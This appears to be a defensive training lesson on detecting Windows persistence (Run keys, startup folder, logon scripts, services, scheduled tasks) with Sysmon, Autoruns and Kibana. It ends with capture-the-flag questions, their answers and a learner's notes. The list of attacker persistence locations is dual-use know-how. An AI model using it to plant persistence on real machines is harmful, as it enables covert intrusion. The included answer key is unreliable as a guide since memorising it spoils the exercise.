This registry key represents one of the oldest persistence techniques in the history of Windows: the data field of any value in a run key points to an executable that is launched on user login. In this example, vmtoolsd.exe is a legitimate executable associated with VMware. This process is executed whenever a user logs in to the device. An attacker, however, can add a value of their choice to these keys in order to execute their malware.

﻿

﻿

Figure 8.4-1

﻿

The registry keys HKCU\SOFTWARE\Microsoft\CurrentVersion\Run and HKCU\SOFTWARE\Microsoft\CurrentVersion\RunOnce hold values that indicate commands that should be run when that user logs in. The most common registry keys associated with this behavior are listed below. This list includes the keys that are applied to all users (HKLM) and the ones associated with the current user (HKCU).

HKLM\Software\Microsoft\Windows\CurrentVersion\Run

HKCU\Software\Microsoft\Windows\CurrentVersion\Run

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx (not created by default on Windows Vista and newer, but can be created by adversaries or system administrators)

HKCU\Software\Microsoft\Windows NT\CurrentVersion\Run (legacy; older versions of Windows)

The following list shows registry keys used to set Startup folder items for persistence:

HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

The following list shows registry keys used to control automatic startup of services during boot:

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce

HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices

HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices

Policy settings can be set to specify startup programs in these registry keys:

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run

Custom actions can be added to the Winlogon key to add additional actions that occur on a computer system running Windows 7 and later:

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

Programs can be listed in the load value of HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows to load when any user logs on.

﻿

Adversaries have also been seen to modify the BootExecute value of HKLM\SYSTEM\CurrentControlSet\Control\Session Manager from the default autocheck — autochk * to other programs. The default value is used for file system integrity checks after an abnormal shutdown.

﻿

Not all of the above keys and values may be present on a system but may be created by adversaries to enable that feature. Since Windows applications also use the registry to store configuration data, there are application-specific registry keys that may also be abused by attackers to run malicious code and maintain persistence.

﻿

Startup Folder
﻿

The Windows startup folder is also an old method of persistence. Any file placed in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\ is launched automatically whenever any user logs in. It is less common for this method to be used because it is easily detected by anti-virus software or even an observant technician.

﻿

Detecting Persistence via Registry Run Keys/Startup Folder
﻿

Many environments have anti-virus software installed on endpoints that monitor the well-known autorun registry keys and startup folders. For manual detection on the host, use the Sysinternal s Autoruns too l. For detecting malicious run key activity, use Sysmon event Identifier (ID) 12 (RegistryEvent [Object create and delete]), 13 (RegistryEvent [Value Set]), and 14 (RegistryEvent). Sysmon event ID 11 (FileCreate) can be used to detect the creation of files in startup folders. These methods are covered in a lab later in the lesson.

Which non-default registry key can be used to execute a command on startup before it is removed?
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx

Logon Script (Windows)
Adversaries also use Windows logon scripts to maintain persistence by executing a script during logon initialization. Logon scripts can be run when a specific user  — or group of users — log on to a Windows system. To set up execution of a logon script, the adversary adds the path to the script to the HKCU\Environment\UserInitMprLogonScript registry key.

﻿

Detecting Persistence via Logon Script (Windows)
﻿

To detect suspicious persistence use the following Sysmon event IDs:

Sysmon event ID 12 (RegistryEvent [Object create and delete])
Sysmon event ID 13 (RegistryEvent [Value Set])
Sysmon event ID 14 (RegistryEvent [Key and Value Rename])
Creating a targeted alert or report specifically monitoring HKCU\Environment\UserInitMprLogonScript reduces the amount of noise in large networks.﻿

For device investigations, the Autoruns tool can be used to spot logon scripts.

Which registry key is used for logon scripts?
HKCU\Environment\UserInitMprLogonScript

Windows Service
Services are computer programs that run in the background. Instead of interacting with the user directly, the intention is to add increased functionality to the Windows Operating System (OS). They offer system resources to accomplish background tasks like handling remote procedure calls or internet information services. Not every executable can be registered as a Windows service; they must be able to interact with the Windows Service Control Manager (services.exe) or they are killed on startup.

﻿

Adversaries often create a new service or modify an existing service as a way to maintain persistence. Services can be modified using the reg command or the sc command. Information about services is stored in the HKLM\SYSTEM\CurrentControlSet\Services registry key.

﻿

Detecting Persistence via Windows Service
﻿

If a service is modified those changes are reflected in the HKLM\SYSTEM\CurrentControlSet\Services registry key. This key can be monitored using the following:

Sysmon event ID 12 (RegistryEvent [Object create and delete])
Sysmon event ID 13 (RegistryEvent [Value Set])
Sysmon event ID 14 (RegistryEvent [Key and Value Rename])
Checking for a suspicious process call tree is another method of detection. Often valid services can be used to call malicious files. For example, Microsoft Word launching a malicious script. This can be detected using Sysmon event ID 1.

﻿

A useful event ID for monitoring service activity is Windows event ID 4697 (A service was installed in the system). Monitoring for this event is recommended, especially on high-value assets or computers, because a new service installation should be planned and expected. Unexpected service installation should trigger an alert.

﻿

Listed below are Microsoft's security monitoring recommendations for this event ID:

Monitor for all events where Service File Name is not located in %windir% or Program Files/Program Files (x86) folders. Typically new services are located in these folders.
Report all Service Type equals 0x1 (KernelDriver), 0x2 (FileSystemDriver), or 0x8 (RecognizerDriver). These service types start first and have almost unlimited access to the OS from the beginning of the OS startup. These types are rarely installed.
Report all Service Start Type equals 0 (Boot) or 1 (System). These service start types are used by drivers, which have unlimited access to the OS.
Report all Service Start Type equals 4 (Disabled). It is not common to install a new service in the Disabled state.
Report all Service Account not equals localSystem, localService or networkService to identify services that are running under a user account.
Autoruns is a useful tool when triaging a machine for persistence. Not only does it list all the information for Windows autorun locations but it also sends the hash of each file to VirusTotal to be compared against their database of known good and known m alicious binarie s. Autoruns can also submit the image (actual file) of unknown hashes, but it is not configured to do so by default. Submitting the image of unknow n hashes to V irusTotal should only be done if the network policy allows it.

Which tool displays common persistence locations in Windows and checks the files against the VirusTotal database?
Autoruns

Scheduled Task
Starting with Windows 95, Microsoft packaged a task scheduler with its OS to start and restart predefined tasks at pre-set times. This makes it an ideal tool for an adversary to obtain persistence. For example, an adversary sets up a scheduled task to execute a script regularly or upon startup that checks to make sure the backdoor is active and if it is not, to have the script activate it.

﻿

Detecting Persistence via Scheduled Tasks
﻿

Monitor process execution from svchost.exe (Windows 10) and taskeng.exe (all versions older than Windows 10).

﻿

There are several Windows event IDs, listed below, that can be utilized to hunt for malicious scheduled task activity.

Event ID 106 on Windows 7, Server 2008 R2 — Scheduled task registered
Event ID 140 on Windows 7, Server 2008 R2/4702 on Windows 10, Server 2016 — Scheduled task updated
Event ID 141 on Windows 7, Server 2008 R2/4699 on Windows 10, Server 2016 — Scheduled task deleted
Event ID 4698 on Windows 10, Server 2016 — Scheduled task created
Event ID 4700 on Windows 10, Server 2016 — Scheduled task enabled
Event ID 4701 on Windows 10, Server 2016 — Scheduled task disabled
The Windows Task Scheduler files are stored in %SYSTEMROOT%\System32\Tasks. This location can be monitored for changes in an attempt to detect malicious activity. Autoruns is a useful tool when triaging a host for persistence via scheduled tasks. 

Where are the Windows Task Scheduler files located?
%SYSTEMROOT%\System32\Tasks

Detecting Windows Persistence Using Autoruns
The CPT is assigned a mission to hunt for and remove malware from infected machines. The malware was found and removed, but it keeps coming back. Check the machine for persistence methods that the malware is using.

2. From the desktop, open Autoruns64.

﻿

Autoruns is part of the Sysinternals suite of tools built by Microsoft. Once opened it scans the system and lists all the known persistence locations which greatly speeds up the time it takes for an analyst to perform a hunt on an infected system for persistence.

﻿

Near the top of the Autoruns window, there are tabs for each area of persistence that occurs.


Observe the two suspicious entries pointing to C:\persistence.bat.

﻿

These entries are considered suspicious for the following reasons:

The publisher is not verified. (The digital signature is not trusted by the system or it has no digital signature at all.)

It is uncommon for a batch script to run directly from C:\.

There is no description.

The HKCU\Environment\UserInitMprLogonScript location does not exist by default. It has to be created.

These indicators on their own are not necessarily suspicious. However, when combined it raises the likelihood that it is infected.

﻿

Adversaries often attempt to blend in with legitimate services and files. This makes it vital to be aware of what is considered normal activity on a system in the environment. Knowing what is normal makes it more obvious to pick out suspicious activity.

﻿

4. Select the Scheduled Tasks tab.

The persistence.bat script is also being started from a scheduled task. During operational use of Autoruns, this also provides insights on the files from VirusTotal. This is helpful to quickly identify known malicious files. Because this lab environment does not contain the internet, Autoruns is unable to reach VirusTotal to pull that additional information.

﻿

5. Explore the other tabs and become familiar with additional persistence locations.

﻿

In this scenario, there are three persistence methods that would need to be remediated.

In Autoruns, which field identifies whether a binary's signature is verified?
Publisher

Detecting Windows Persistence Using a SIEM
. Run a search over the given time range Dec 6, 2021 @ 17:00:00.000 → Dec 6, 2021 @ 18:00:00.000.


There are more than 129,000 events, which is too many to manually sift through.


6. Narrow the results by searching for Sysmon registry events 12, 13, or 14.
event.code: (12 OR 13 OR 14)



There are now more than 2,000 events, which is still too many to analyze one by one.


7. There are several registry keys that have the word Run in their paths. Try searching for all events where registry.path has the word Run in it.
event.code: (12 OR 13 OR 14) AND registry.path: Run


8. Make the events more readable by adding the following fields:
host.name
winlog.user.identifier
event.code
event.action
registry.path
winlog.event_data.Details
winlog.event_data.EventType


This looks like suspicious activity. It is rare that a legitimate file runs directly from the root of C:\. This file location needs to be investigated and reported.


9. Check for additional persistence activity using the logon script method.
event.code: (12 OR 13 OR 14) AND registry.path: UserInitMprLogonScript


The adversary is also using the user logon script method as an additional persistence method. This registry location would also need to be remediated. Two forms of persistence were found on ch-dev-1, a common registry run key and a logon script.

Which field in Kibana contains the value of a registry key that was created or modified?
winlog.event_data.Details

Challenge: Detecting Windows Persistence
This challenge is a capture-the-flag scenario meant to put the knowledge gained from this lesson to the test.

﻿

The ch-treasr-1 host has been loaded with seven persistence methods. Both Security Onion and direct access to ch-treasr-1 are required to hunt down the persistence methods. Not all of the persistence methods can be found by only hunting in Security Onion or only manually hunting on ch-treasr-1. Observe and take note of the files being executed as well as the location. The flags are Universally Unique Identifiers (UUID) and are located in the files being executed by the persistence. To view a flag, open a command prompt and use the type command. In the following example, the file output is the flag named malware and is located in C:\Downloads.

type C:\Downloads\malware
﻿

The flags look like this: 1FAD2399-DF1F-4C0D-A6C0-4266B725BC5B.


NOTE: The group of Knowledge Checks that follow this task refers to the challenge, and asks in which persistence method each file and UUID were found. This requires you to take detailed notes. 

﻿Enter the Registry persistence path of the file that contains 95DC7B2F-DB34-4FF5-8252-D99A3818E71C.
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\CurrentVersion\Run

Enter the Registry persistence path of the file that contains A9A2223D-19CB-491A-BEC5-C26E5ED73B85.
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_USERS\S-1-5-21-805230236-1507193615-3065256940-2740\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

Enter the Registry persistence path of the file that contains 65288379-C00D-4C37-8F32-7CBCAD3C7502.
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

Enter the Registry persistence path of the file that contains 39104F36-00CD-4997-846F-FFBA43105312.
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx

Enter the file path of the file that contains 713FDF24-5572-44A9-9735-E982E121CEF8.
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

Enter the Registry persistence path of the file that contains F1605B37-9DCC-4103-88D4-7E7B0EF4214A.
HKCU\Environment\UserInitMprLogonScript
HKEY_USERS\S-1-5-21-805230236-1507193615-3065256940-2740\Environment
HKEY_CURRENT_USER\Environment\UserInitMprLogonScript

Enter the file path of the file that contains 57123DC9-7E14-4C68-8671-8BCA144FA8A0
C:\Program Files\opera\sldkfj
C:\Program Files\opera

DATA IS FULL PATH PAST .EXE IF POSSIBLE

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

AUTORUNS
PERSISTANT HOWEVER NOT EVERYTHING THAT IS PERSISTANCE IS IN AUTORUNS

DATA ASSOCIATED WITH REGISTRY
DATA DATA
winlog.event_data.Details

get good


